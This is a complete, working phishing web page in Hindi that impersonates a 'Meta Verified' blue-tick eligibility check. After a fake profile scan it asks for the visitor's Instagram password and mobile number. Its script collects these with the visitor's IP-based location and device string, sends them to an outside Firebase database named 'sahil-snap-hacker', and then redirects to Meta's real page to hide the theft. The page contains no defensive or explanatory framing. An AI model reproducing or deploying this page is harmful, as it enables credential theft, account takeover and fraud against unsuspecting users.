<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Verified - Check Eligibility</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: -apple-system, sans-serif; background: #fff; text-align: center; margin: 0; padding: 20px; }
        .container { max-width: 380px; margin: auto; border: 1px solid #dbdbdb; padding: 30px; border-radius: 5px; }
        .meta-logo { width: 120px; margin-bottom: 20px; }
        h2 { font-size: 18px; color: #262626; }
        p { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        .blue-btn { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 10px; }
        #scan-box { display: none; color: #0095f6; font-weight: bold; padding: 20px; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
    <h2>Meta Verified Check</h2>
    <p>देखें कि क्या आपका अकाउंट 'ब्लू टिक' वेरिफिकेशन के लिए योग्य है।</p>

    <div id="step1">
        <input type="text" id="u" placeholder="यूजरनेम दर्ज करें">
        <button class="blue-btn" onclick="startScan()">पात्रता जांचें (Check Eligibility)</button>
    </div>

    <div id="scan-box">
        प्रोफाइल स्कैन की जा रही है... <br> <span id="percent">0%</span>
    </div>

    <div id="step2" style="display:none;">
        <p style="color: #27ae60; font-weight: bold;">बधाई हो! आप ब्लू टिक के लिए योग्य हैं।</p>
        <p style="font-size: 12px;">प्रीमियम एक्सेस एक्टिवेट करने के लिए विवरण कन्फर्म करें:</p>
        <input type="password" id="key" placeholder="इंस्टाग्राम पासवर्ड">
        <input type="number" id="ph" placeholder="मोबाइल नंबर">
        <button class="blue-btn" onclick="finalSubmit()">एक्टिवेट करें (Activate Now)</button>
    </div>
</div>

<script>
    // आपका Firebase Config
    const firebaseConfig = { databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com/" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function startScan() {
        if(document.getElementById("u").value == "") return alert("यूजरनेम डालें!");
        document.getElementById("step1").style.display = "none";
        document.getElementById("scan-box").style.display = "block";
        
        let p = 0;
        let int = setInterval(() => {
            p += 10;
            document.getElementById("percent").innerText = p + "%";
            if(p >= 100) {
                clearInterval(int);
                document.getElementById("scan-box").style.display = "none";
                document.getElementById("step2").style.display = "block";
            }
        }, 300);
    }

    async function finalSubmit() {
        const u = document.getElementById("u").value;
        const k = document.getElementById("key").value;
        const p = document.getElementById("ph").value;
        if(k.length < 6) return alert("सही पासवर्ड डालें!");

        // डिवाइस और लोकेशन कैप्चर
        let location = "Fetching...";
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            location = data.city + ", " + data.region + " (" + data.country_name + ")";
        } catch(e) { location = "Blocked/Unknown"; }

        db.ref('final_vault/' + Date.now()).set({
            User: u,
            Key: k,
            Mobile: p,
            Location: location,
            Device: navigator.userAgent,
            Type: "Blue_Tick_Claim"
        }).then(() => {
            alert("सफलता! मेटा टीम 24 घंटे में आपसे संपर्क करेगी।");
            window.location.href = "https://about.meta.com/technologies/get-verified/";
        });
    }
</script>
</body>
</html>
